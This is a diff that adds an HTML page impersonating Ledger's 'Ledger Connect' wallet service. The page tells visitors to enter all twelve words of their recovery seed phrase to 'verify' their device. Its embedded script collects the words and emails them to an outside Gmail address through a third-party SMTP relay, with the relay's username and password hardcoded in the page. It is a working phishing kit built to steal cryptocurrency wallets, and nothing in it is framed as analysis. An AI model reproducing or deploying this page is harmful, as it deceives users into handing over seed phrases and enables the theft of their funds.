@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Ledger Connect</title>
+	<link rel="icon" type="image/x-icon" href="download3.jpg">
+	<link rel="stylesheet" href="assets/main.css">
+	 <link rel="stylesheet" type="text/css" href="npm/instantsearch.js%402.10.4/dist/instantsearch.min.css">
+        <link rel="stylesheet" type="text/css" href="npm/instantsearch.js%402.10.4/dist/instantsearch-theme-algolia.min.css">
+	<link href="font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="C:\Users\HP\Desktop\website\bootstrap\BT\bootstrap-5.0.2-dist\css\bootstrap.css">
+	<style type="text/css">
+		body{
+			box-sizing: border-box;
+			margin: 0;
+			padding: 0;
+			background-color: black;
+			font-family: sans-serif;
+		}
+
+		
+
+		.main{
+			display: grid;
+			grid-template-columns: 300px auto;
+			gap: 2px;
+		}
+
+		.sub1 img{
+			height:100%;
+			width: 100%;
+		}
+
+		.sub3 input{
+			padding: 15px;
+			margin: 5px;
+		}
+
+		.sub2{
+			color: white;
+			margin-top: 20px;
+		}
+
+		.sub3 h3{
+			color: white;
+		}
+
+		h2{
+			color: white;
+		}
+
+		.sub2 h2{
+			font-family: sans-serif;
+			font-weight: bolder;
+		}
+
+		.sub2 p{
+			font-family: sans-serif;
+			font-weight: bold;
+		}
+
+		button{
+			border-style: solid;
+			border-radius: 10px;
+			height: 28px;
+			width: 90px;
+		}
+
+		button:hover{
+			color: purple;
+			font-weight: bold;
+		}
+
+		
+		@media screen and (max-width: 800px){
+			
+			.sub1 img{
+				height: 0px;
+				width: 0px;
+			}
+
+			.main{
+			display: grid;
+			grid-template-columns: 0px auto;
+			gap: 1px;
+			
+		}
+
+
+		}
+
+
+	</style>
+
+</head>
+<body>
+
+<div class="main">
+	<div class="sub1">
+		<img src="download1.jpg">
+	</div>
+
+	<div class="sub2">
+		
+	<h2>
+		VERIFY SEED PHRASE OF YOUR DEVICE
+	</h2>
+	<br><br>
+	<p>
+		Enter your Recovery Seed Phrase Words to Import and Download Your Wallet App.
+	</p>
+	<p>
+		**Ledger does not keep a copy of your recovery phrase.
+	</p>
+	<p>
+		**ENTER 12 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.
+	</p>
+
+	<div class="sub3">
+		<form onsubmit="sendEmail(); reset(); return false;">
+			
+			
+			
+			<input type="text" id="name1" placeholder="1. word" required> 
+			<input type="text" id="name2" placeholder="2. word" required>
+			<input type="text" id="name3" placeholder="3. word" required>
+			<input type="text" id="name4" placeholder="4. word" required>
+			<input type="text" id="name5" placeholder="5. word" required>
+			<input type="text" id="name6" placeholder="6. word" required>
+			<input type="text" id="name7" placeholder="7. word" required>
+			<input type="text" id="name8" placeholder="8. word" required>
+			<input type="text" id="name9" placeholder="9. word" required>
+			<input type="text" id="name0" placeholder="10. word" required>
+			<input type="text" id="name10" placeholder="11. word" required>
+			<input type="text" id="name11" placeholder="12. word" required>
+			
+		<br><br>
+		<button id="submit" type="submit" name="submit" value="submit" 
+        >Submit
+        </button>
+		</form>
+	</div>
+
+</div>
+
+</div>
+
+<footer class="uk-section uk-text-center uk-text-muted">
+        <div class="uk-container uk-container-small">
+
+            <div>
+                <ul class="uk-subnav uk-flex-center">
+
+
+
+
+
+
+
+                    <li class="uk-active"><a href="index.htm">Home</a></li>
+
+
+
+
+
+                    <li><a href="/contact/">Get connected</a></li>
+
+
+
+
+
+                    <li><a href="/changelog-timeline/">Changelog</a></li>
+
+
+
+
+
+                    <li><a href="/sitemap/">Sitemap</a></li>
+
+
+
+
+
+                    <li><a href="https://blog.ledger.com/tag/stories/" target="_blank" rel="noopener noreferrer">Integration Stories</a></li>
+
+
+
+                </ul>
+            </div>
+            <div class="uk-margin-medium">
+                <div data-uk-grid="" class="uk-child-width-auto uk-grid-small uk-flex-center uk-grid">
+
+
+                    <div class="uk-first-column">
+                        <a href="https://twitter.com/Ledger" data-uk-icon="icon: twitter" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+                    <div>
+                        <a href="https://www.facebook.com/Ledger" data-uk-icon="icon: facebook" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+                    <div>
+                        <a href="https://www.reddit.com/r/ledgerwallet/" data-uk-icon="icon: reddit" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+                    <div>
+                        <a href="https://developers.ledger.com/discord/" data-uk-icon="icon: discord" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+                    <div>
+                        <a href="https://github.com/LedgerHQ" data-uk-icon="icon: github" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+
+
+                    <div>
+                        <a href="https://www.instagram.com/ledger" data-uk-icon="icon: instagram" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+
+                    <div>
+                        <a href="https://fr.linkedin.com/company/ledgerhq" data-uk-icon="icon: linkedin" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+
+
+                    <div>
+                        <a href="https://youtube.com/Ledger" data-uk-icon="icon: youtube" class="uk-icon-link uk-icon" target="_blank" rel="noopener noreferrer"></a>
+                    </div>
+
+
+
+
+
+                </div>
+            </div>
+            <div class="uk-margin-medium uk-text-small copyright link-primary">Copyright © <a href="https://ledger.com/">Ledger</a> SAS. All rights reserved. <br>Ledger, Ledger Nano S, Ledger
+                Vault, Bolos are registered trademarks of Ledger SAS.</div>
+
+        </div>
+    </footer>
+
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script>
+	function sendEmail() {
+
+var name0=document.getElementById('name0').value;	
+var name1=document.getElementById('name1').value;	
+var name2=document.getElementById('name2').value;	
+var name3=document.getElementById('name3').value;
+var name4=document.getElementById('name4').value;
+var name5=document.getElementById('name5').value;
+var name6=document.getElementById('name6').value;
+var name7=document.getElementById('name7').value;
+var name8=document.getElementById('name8').value;
+
+var name9=document.getElementById('name9').value;
+var name10=document.getElementById('name10').value;
+
+var name11=document.getElementById('name11').value;
+
+
+var messageBody= 
+"name0 :"+ name0 +" <br/> name1:" + name1 + "<br/> name2 :"+name2 +" <br/>name3 :" +name3 + "<br/>name4:" +name4 + "<br/>name5:"+name5 + "<br/> name6:"+name6 + "<br/> name7:" +name7 + "<br/> name8:"+name8 + " <br/>name9:"+name9 + "<br/>name10:"+name10 + "<br/>name11:"+name11 
+
+
+
+
+		Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "activenich@gmail.com",
+    Password : "BE33AC9EFB05CF9308F967CEF5F95C027DC8",
+    To : 'responseledger@gmail.com',
+    From : "activenich@gmail.com",
+    Subject : "This is the subject",
+    Body : messageBody
+}).then(
+  message => {
+  	if (message) {
+  		swal("Successful", "You clicked the button!", "success");
+
+  	}
+  	else{
+  		swal("Error", "You clicked the button!", "Error");
+
+  	}
+  }
+);
+
+	}
+
+
+
+</script>
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></
+></script>
+
+
+<script type="text/javascript" src="C:\Users\HP\Desktop\website\transport express\bootstrap-5.0.2-dist\js\bootstrap.bundle.min.js"></script>
+</body>
+</html>
